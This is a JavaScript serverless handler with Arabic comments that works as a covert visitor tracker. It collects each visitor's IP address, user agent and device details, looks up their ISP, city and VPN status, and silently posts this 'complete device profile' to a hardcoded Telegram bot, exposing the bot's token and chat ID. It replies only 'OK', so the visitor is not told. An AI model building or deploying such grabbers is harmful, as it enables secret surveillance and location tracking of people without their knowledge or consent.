export default async function handler(req, res) {
    const { res: screenRes, lang, mem, cores, plat, bat } = req.query;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const botToken = "8677038270:AAF7pXdGVjJDBUgftzoDP0lnJsJEbNPjhpQ";
    const chatId = "5244299184";

    try {
        // 1. جلب معلومات الشبكة (الشركة والموقع) - لا تحذف هذا الجزء
        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,mobile,proxy`);
        const geo = await geoRes.json();

        // 2. تجهيز المعلومات بشكل مرتب
        const networkType = geo.mobile ? "📱 بيانات هاتف" : "🏠 واي فاي/ثابت";
        const vpnStatus = geo.proxy ? "⚠️ يستخدم VPN" : "✅ اتصال مباشر";

        const message = `📂 **ملف تعريف الجهاز الكامل (صامت)** 📂\n\n` +
                        `🌐 **الاتصال:** \`${ip}\`\n` +
                        `🏢 **الشركة:** ${geo.isp || 'MATTEL'}\n` +
                        `📡 **الشبكة:** ${networkType}\n` +
                        `🛡️ **الحماية:** ${vpnStatus}\n\n` +
                        `📍 **الموقع:** ${geo.country}, ${geo.city}\n` +
                        `🔋 **البطارية:** ${bat || 'مخفية بواسطة النظام'}\n\n` +
                        `💻 **مواصفات الهاردوير:**\n` +
                        `• الذاكرة (RAM): ${mem || 'تحت الحماية'}\n` +
                        `• المعالج: ${cores} Core\n` +
                        `• الشاشة: ${screenRes}\n` +
                        `• اللغة: ${lang}\n\n` +
                        `📱 **البصمة الكاملة:**\n\`${userAgent}\`\n\n` +
                        `⏰ **التوقيت:** ${new Date().toLocaleString('ar-EG')}`;

        // 3. إرسال الرسالة
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
        });

    } catch (error) {
        console.error("Error:", error);
    }

    res.status(200).send("OK");
}
